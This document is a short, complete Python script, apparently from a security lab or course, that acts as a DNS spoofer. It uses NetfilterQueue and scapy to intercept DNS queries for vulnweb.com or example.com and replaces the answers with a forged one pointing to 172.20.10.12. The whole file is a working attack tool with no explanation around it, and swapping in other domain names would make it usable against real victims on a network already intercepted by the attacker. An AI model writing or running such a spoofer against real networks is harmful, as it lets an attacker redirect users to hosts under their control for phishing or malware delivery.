#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSQR):  # DNS Query, not Response
        qname = scapy_packet[scapy.DNSQR].qname

        if b"vulnweb.com" in qname or b"example.com" in qname:
            print("[+] Spoofing DNS request for:", qname.decode())

            spoofed_packet = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
                             scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=53) / \
                             scapy.DNS(id=scapy_packet[scapy.DNS].id,
                                       qr=1, aa=1, qd=scapy_packet[scapy.DNS].qd,
                                       an=scapy.DNSRR(rrname=qname, rdata="172.20.10.12"))

            packet.set_payload(bytes(spoofed_packet))

    packet.accept()

queue = NetfilterQueue()
queue.bind(0, process_packet)
print("[+] DNS Spoofer running...")
queue.run()